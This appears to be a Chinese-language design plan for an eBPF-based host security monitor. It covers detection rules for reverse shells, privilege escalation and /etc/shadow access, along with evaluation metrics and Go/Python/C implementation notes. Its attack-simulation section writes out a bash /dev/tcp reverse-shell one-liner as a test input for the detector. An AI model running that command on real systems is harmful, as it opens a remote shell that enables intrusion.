项目概述与核心目标

1.1 项目背景与定位

随着云计算和容器化技术的普及，现代操作系统面临着日益复杂和隐蔽的安全威胁。传统的基于内核模块或用户态代理的安全监控方案，往往存在性能开销大、侵入性强、易被绕过等问题。eBPF（extended Berkeley Packet Filter）技术的出现，为内核级别的安全监控提供了一种革命性的解决方案。它允许在内核中安全、高效地运行沙箱程序，实现对系统调用、网络事件等关键行为的深度观测，而无需修改内核源码或加载内核模块131。

系统有效性验证与攻击模拟方案

2.1 攻击模拟策略设计

2.1.1 模拟攻击场景定义

反弹 Shell 检测

监控 connect 系统调用，当进程（如 bash）的标准输入输出重定向到网络套接字时触发告警252。

检测条件：comm=bash && fd∈{0,1,2} && 网络连接
权限提升行为

通过监控 execve 系统调用，检测 sudo、su 或 SUID 二进制文件的执行，识别权限提升尝试。

检测条件：execve(/bin/bash) && UID变化(非0→0)
敏感文件异常访问

监控对 /etc/shadow、 /etc/passwd 等敏感文件的访问模式，检测异常读写行为。

检测条件：openat(/etc/shadow) && 写入权限 && 非特权用户

2.1.2 攻击模拟脚本开发

反弹 Shell 模拟脚本

# reverse_shell_simulator.sh
ATTACKER_IP="127.0.0.1"

# 启动监听

# 执行反弹 shell
/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1

2.2 系统有效性评估方法

2.2.1 检测准确性评估

真阳性率 (TPR) 与假阳性率 (FPR)
TPR = TP / (TP + FN) - 理想值 100%
FPR = FP / (FP + TN) - 理想值 0%
规则引擎匹配测试

为每个攻击场景编写对应的检测规则，验证规则引擎的匹配能力和边界条件处理。

AI 模型评估

使用准确率、精确率、召回率和 F1 分数评估 Isolation Forest 模型的性能。

方案优化与冗余消除

3.1 现有方案分析与评价

潜在冗余识别

  • 日志与存储模块重叠：告警数据重复存储在 alerts.log 和 SQLite 中
  • 规则引擎与 AI 检测协同不足：两者相对独立，可能导致重复告警

原方案问题

  • 周 3 和周 4 任务可以合并优化
  • 数据流转存在冗余环节
  • 跨语言通信机制考虑较晚
  • 规则引擎与 AI 模块协同不足

优化方向

  • 合并事件处理与过滤中心
  • 统一数据存储格式
  • 优化 Go-Python 通信机制
  • 引入现代化开发工具

3.2 优化后的实现步骤

合并与简化数据处理流程

将周 3 和周 4 任务合并为"事件处理与过滤中心"，统一处理事件过滤、规则匹配和存储逻辑。

数据流优化： 原始事件 → 过滤中心 → {规则引擎, 事件存储}

优化跨语言通信机制

采用轻量级消息队列（如 Redis Stream）作为 Go 后端与 Python AI 模块的通信中间件，实现异步解耦。

通信模式： Go → Redis Queue → Python AI → 结果写回

Python 项目管理

自动化构建

使用 Makefile 管理构建、测试和部署流程。

代码生成

技术实现细节

6.1 eBPF 程序设计 (C)

libbpf 和 CO-RE 实现

  • 基于 libbpf 库开发，采用 CO-RE 技术
  • 依赖内核 BTF 信息实现一次编译，到处运行
  • 使用 BPF_CORE_READ 宏访问内核数据结构
  • 以 libbpf-bootstrap 为项目模板

Tracepoint 与 Kprobe 选择

  • 主要使用 tracepoint/syscalls/sys_enter_*
  • hook 系统调用的进入和退出事件
  • 谨慎使用 kprobes 获取深层上下文
  • 优先选择稳定的 ABI 接口

Ring Buffer 数据传输

内核态实现
  • 定义与传输数据对应的 struct
  • 使用 bpf_ringbuf_output 提交数据
  • 支持 per-CPU 缓冲区避免竞争
用户态读取
  • Go 程序通过 libbpf API 轮询
  • 从 Ring Buffer 读取事件数据
  • 解析为 Go 结构体进行处理

6.2 后端服务实现 (Go)

事件接收与处理

  • 使用 cilium/ebpf 或 libbpf-go 交互
  • 通过带缓冲 channel 解耦接收和处理
  • worker goroutine 并发处理事件
  • 提高系统吞吐量和响应性

规则引擎实现

  • 基于轻量级表达式求值库实现
  • 支持 govaluate 或 expr 库
  • YAML 规则解析为可执行表达式
  • 缓存解析后的规则提高性能

API 与 WebSocket

  • 使用 gin-gonic/gin 或 gorilla/mux
  • RESTful API 提供查询接口
  • WebSocket 实时推送事件和图谱更新
  • 支持事件流和告警推送

6.3 AI 异常检测模块 (Python)

特征工程实现

  • 使用 pandas 和 numpy 处理数据
  • 提取统计特征（频率、数量等）
  • 构建序列特征（N-gram 向量）
  • 计算图特征（节点度、聚类系数）

模型训练与推理

  • 使用 scikit-learn 的 IsolationForest
  • 仅使用正常行为数据训练基线
  • 通过 decision_function 计算异常分数
  • 支持增量学习适应业务变化

与 Go 后端通信

  • 通过 HTTP local REST 接口通信
  • Redis 作为消息队列中间件
  • 异步处理提高吞吐量
  • 支持批量事件评分
